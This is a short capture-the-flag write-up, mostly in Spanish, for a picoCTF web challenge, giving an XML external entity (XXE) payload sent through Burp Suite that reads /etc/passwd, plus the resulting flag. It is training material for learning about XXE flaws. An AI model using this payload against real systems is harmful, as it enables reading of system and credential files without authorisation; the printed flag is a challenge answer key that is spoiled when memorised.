## Descripción 
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:57246/)
## Solución 
Con el proxy, se manda a  repeater en burpsuite y se inyecta:
```

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]> <data><ID>&xxe;</ID></data>

```
Se manda el request y se respondió con la bandera
picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}
## Notas
## Referencias
